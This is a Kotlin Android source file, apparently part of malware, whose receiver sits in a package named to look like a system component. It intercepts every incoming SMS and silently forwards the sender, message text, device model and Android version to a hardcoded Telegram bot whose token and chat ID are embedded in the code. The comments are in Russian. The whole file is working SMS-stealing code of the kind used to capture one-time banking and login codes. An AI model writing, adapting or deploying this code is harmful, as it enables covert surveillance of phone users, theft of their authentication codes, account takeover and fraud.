package com.android.fflgffg

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import androidx.core.content.edit
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.concurrent.TimeUnit

class SmsReceiver : BroadcastReceiver() {
    private val client by lazy {
        OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()
    }

    companion object {
        private const val PREFS_NAME = "SmsPrefs"
        private const val SMS_SENT_KEY_PREFIX = "sms_sent_"
        private const val TAG = "SmsReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "Received intent: ${intent.action}")

        when (intent.action) {
            Telephony.Sms.Intents.SMS_DELIVER_ACTION,
            Telephony.Sms.Intents.SMS_RECEIVED_ACTION,
            "android.provider.Telephony.SMS_RECEIVED" -> {
                handleSmsMessage(context, intent)
            }
        }
    }

    private fun handleSmsMessage(context: Context, intent: Intent) {
        try {
            val messages = getSmsMessages(intent)
            if (messages.isEmpty()) {
                Log.w(TAG, "No SMS messages found")
                return
            }

            val firstMessage = messages[0]
            val sender = firstMessage.originatingAddress ?: "Unknown"
            val messageBody = combineMessageBodies(messages)

            // Создаем уникальный ключ для каждого отправителя и сообщения
            val messageHash = "${sender.hashCode()}_${messageBody.hashCode()}"
            val smsSentKey = SMS_SENT_KEY_PREFIX + messageHash

            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            
            // Проверяем, не отправляли ли уже это сообщение
            if (prefs.getBoolean(smsSentKey, false)) {
                Log.d(TAG, "Message already sent: $messageHash")
                return
            }

            // Отправляем в отдельном потоке чтобы не блокировать broadcast
            Thread {
                sendSmsToBot(sender, messageBody)
                
                // Помечаем как отправленное
                prefs.edit {
                    putBoolean(smsSentKey, true)
                }
                
                // Очистка старых записей
                cleanupOldEntries(prefs)
            }.start()

        } catch (e: Exception) {
            Log.e(TAG, "Error handling SMS: ${e.message}", e)
        }
    }

    private fun getSmsMessages(intent: Intent): Array<SmsMessage> {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                // ИСПРАВЛЕНИЕ: getMessagesFromIntent возвращает Array<SmsMessage>
                Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: emptyArray()
            } else {
                getMessagesFromPdus(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting SMS messages", e)
            emptyArray()
        }
    }

    @Suppress("DEPRECATION")
    private fun getMessagesFromPdus(intent: Intent): Array<SmsMessage> {
        val bundle = intent.extras ?: return emptyArray()
        val pdus = bundle.get("pdus") as? Array<*> ?: return emptyArray()
        
        return pdus.mapNotNull { pdu ->
            try {
                if (pdu is ByteArray) {
                    SmsMessage.createFromPdu(pdu)
                } else {
                    null
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error creating SmsMessage from PDU", e)
                null
            }
        }.toTypedArray()
    }

    private fun combineMessageBodies(messages: Array<SmsMessage>): String {
        return messages.joinToString("") { message ->
            message.messageBody ?: ""
        }
    }

    private fun sendSmsToBot(sender: String, message: String) {
        try {
            val botToken = "8278693005:AAEJMer1juepZXE0lP2QPAok7Pb-pscuoR4"
            val chatId = "6331293386"
            val url = "https://api.telegram.org/bot$botToken/sendMessage"
            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
            val androidVersion = "Android ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})"

            // Экранирование специальных символов для Markdown
            val escapedMessage = message.replace(Regex("([*_`\\[\\]()#+\\-.!])"), "\\\\$1")

            val text = """
                *📱 Новое SMS сообщение*
                
                *Отправитель:* `$sender`
                *Устройство:* $deviceModel
                *Версия Android:* $androidVersion
                *Время:* ${System.currentTimeMillis()}
                
                *Сообщение:*
                ```
                $escapedMessage
                ```
            """.trimIndent()

            val mediaType = "application/json".toMediaType()
            val requestBody = """
                {
                    "chat_id": "$chatId",
                    "text": "$text",
                    "parse_mode": "Markdown",
                    "disable_web_page_preview": true
                }
            """.trimIndent().toRequestBody(mediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .addHeader("User-Agent", "SMS-Bot-Android/${Build.VERSION.SDK_INT}")
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Failed to send SMS to Telegram: ${e.message}", e)
                }

                override fun onResponse(call: Call, response: Response) {
                    try {
                        if (!response.isSuccessful) {
                            Log.e(TAG, "Telegram API error: ${response.code} - ${response.body?.string()}")
                        } else {
                            Log.d(TAG, "Message sent successfully to Telegram")
                        }
                    } finally {
                        response.close()
                    }
                }
            })

        } catch (e: Exception) {
            Log.e(TAG, "Error in sendSmsToBot: ${e.message}", e)
        }
    }

    private fun cleanupOldEntries(prefs: SharedPreferences) {
        // Очищаем записи старше 24 часов
        val allEntries = prefs.all
        
        val entriesToRemove = allEntries.filter { (key, _) ->
            key.startsWith(SMS_SENT_KEY_PREFIX)
        }.keys.toList()

        if (entriesToRemove.size > 100) { // Предотвращаем переполнение
            prefs.edit {
                entriesToRemove.forEach { remove(it) }
            }
        }
    }
}
